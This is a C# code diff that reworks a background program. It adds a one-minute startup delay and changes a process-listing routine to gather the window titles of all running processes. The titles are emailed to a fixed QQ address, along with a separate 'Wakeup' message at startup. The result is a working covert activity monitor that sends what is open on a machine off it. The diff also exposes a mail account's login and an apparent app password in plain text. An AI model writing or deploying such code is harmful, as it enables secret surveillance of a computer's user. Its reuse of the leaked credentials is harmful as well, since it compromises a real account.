@@ -26,6 +26,9 @@ namespace Dszy
         {
             try
             {
+                //睡眠1分钟后执行
+                Thread.Sleep(60000);
+
                 //网络判断
                 while (!NetStateHelper.IsConnectInternet())
                 {
@@ -87,32 +90,47 @@ namespace Dszy
         {
             var myProcess = Process.GetProcesses();
             StringBuilder sb = new StringBuilder();
-            sb.Append("<table border=\"1\">");
-            sb.Append("<tr>");
-            sb.Append("<th> pName </th>");
-            sb.Append("<th> pID </th>");
-            sb.Append("<th> pFilePath </th>");
-            sb.Append("</tr>");
-
-            sb.Append("<tr>");
-            sb.Append("<td colspan=\"3\">" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "</td>");
-            sb.Append("</tr>");
 
             foreach (Process p in myProcess)
             {
                 try
                 {
-                    ProcessModule m = p.MainModule;
-                    sb.Append("<tr>");
-                    sb.Append("<td>" + p.ProcessName + "</td>");
-                    sb.Append("<td>" + p.Id + "</td>");
-                    sb.Append("<td>" + m.FileName + "</td>");
-                    sb.Append("</tr>");
+                    sb.AppendLine(p.MainWindowTitle);
                 }
-                catch { };
-                
+                catch (Exception e)
+                {
+                    sb.AppendLine(p.ProcessName + "=========>" + e.Message);
+                }
             }
-            sb.Append("</table>");
+
+
+
+            //sb.Append("<table border=\"1\">");
+            //sb.Append("<tr>");
+            //sb.Append("<th> pName </th>");
+            //sb.Append("<th> pID </th>");
+            //sb.Append("<th> pFilePath </th>");
+            //sb.Append("</tr>");
+
+            //sb.Append("<tr>");
+            //sb.Append("<td colspan=\"3\">" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "</td>");
+            //sb.Append("</tr>");
+
+            //foreach (Process p in myProcess)
+            //{
+            //    try
+            //    {
+            //        ProcessModule m = p.MainModule;
+            //        sb.Append("<tr>");
+            //        sb.Append("<td>" + p.ProcessName + "</td>");
+            //        sb.Append("<td>" + p.Id + "</td>");
+            //        sb.Append("<td>" + m.FileName + "</td>");
+            //        sb.Append("</tr>");
+            //    }
+            //    catch { };
+
+            //}
+            //sb.Append("</table>");
             return sb.ToString();
         }
 
@@ -124,7 +142,7 @@ namespace Dszy
             EMailHelper.UserName = "390059127@qq.com";
             EMailHelper.Password = "phykougiygxcbjif";
             EMailHelper.UserAddress = "390059127@qq.com";
-            var subject = "wakeup";
+            var subject = "Wakeup";
             var content = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
             await EMailHelper.SendEMailAsync(subject, content, new MailboxAddress[] {
                 new MailboxAddress("150101977@qq.com")
@@ -139,7 +157,7 @@ namespace Dszy
             EMailHelper.UserName = "390059127@qq.com";
             EMailHelper.Password = "phykougiygxcbjif";
             EMailHelper.UserAddress = "390059127@qq.com";
-            var subject = "wakeup";
+            var subject = "InfoNow";
             string str = ProcessMiro();
             await EMailHelper.SendEMailAsync(subject, str, new MailboxAddress[] {
                 new MailboxAddress("150101977@qq.com")
